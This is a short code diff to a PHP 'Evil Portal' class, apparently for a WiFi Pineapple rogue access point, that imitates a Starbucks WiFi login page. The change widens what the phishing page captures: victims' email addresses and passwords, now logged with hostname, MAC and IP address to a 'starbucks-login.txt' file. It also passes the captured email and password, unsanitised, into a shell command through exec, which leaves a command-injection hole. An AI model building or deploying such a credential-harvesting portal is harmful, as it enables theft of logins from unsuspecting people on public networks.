@@ -42,7 +42,11 @@ class MyPortal extends Portal
         if (isset($_POST['email'])) {
             $email = isset($_POST['email']) ? $_POST['email'] : 'email';
             $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
-            file_put_contents("$dir/evilportal-logs/starbucks-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
+            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
+            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
+            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
+            file_put_contents("$dir/evilportal-logs/starbucks-login.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+
             exec("pineapple notify $email' - '$pwd");
         }
         // handle form input or other extra things there
